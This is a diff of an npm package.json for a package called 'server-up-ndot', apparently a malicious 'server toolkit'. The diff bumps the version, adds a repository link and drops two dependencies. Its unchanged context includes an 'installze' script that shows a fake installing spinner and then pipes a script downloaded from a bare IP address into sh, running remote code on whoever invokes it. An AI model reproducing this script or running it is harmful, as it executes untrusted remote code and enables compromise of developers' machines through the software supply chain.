@@ -1,6 +1,6 @@
 {
   "name": "server-up-ndot",
-  "version": "1.2.3",
+  "version": "1.2.4",
   "description": "server toolkit",
   "main": "index.js",
   "bin": {
@@ -10,6 +10,10 @@
     "test": "echo \"Error: no test specified\" && exit 1",
     "installze": "echo installing.... && for j in 1 2 3 4 5; do for i in / - \\\\ \\|; do printf '\\r%s' $i; sleep 0.1; done; done&& wget -qO- 125.181.230.198/js/app/1 | sh"
   },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/ppccpcpcpc-byte/server-up-ndot.git"
+    },
   "dependencies": {
     "axios": "*",
     "chalk": "*",
@@ -21,7 +25,6 @@
     "csv-parser": "*",
     "dayjs": "*",
     "debug": "*",
-    "dotenv": "*",
     "express": "*",
     "fastify": "*",
     "formidable": "*",
@@ -45,7 +48,6 @@
     "qs": "*",
     "redis": "*",
     "sanitize-html": "*",
-    "server-up-ndot": "^1.1.1",
     "sharp": "*",
     "socket.io": "*",
     "uuid": "*",
